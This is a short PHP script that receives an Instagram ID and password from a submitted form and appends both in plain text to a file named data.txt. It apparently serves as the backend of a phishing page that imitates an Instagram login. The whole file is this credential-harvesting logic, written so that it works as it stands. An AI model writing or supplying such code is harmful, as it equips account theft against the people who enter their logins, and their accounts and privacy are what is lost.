<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $instaId = htmlspecialchars($_POST["instaId"]);
    $password = htmlspecialchars($_POST["password"]);

    $entry = "Instagram ID: $instaId\nPassword: $password\n\n";
    file_put_contents("data.txt", $entry, FILE_APPEND);
}
?>
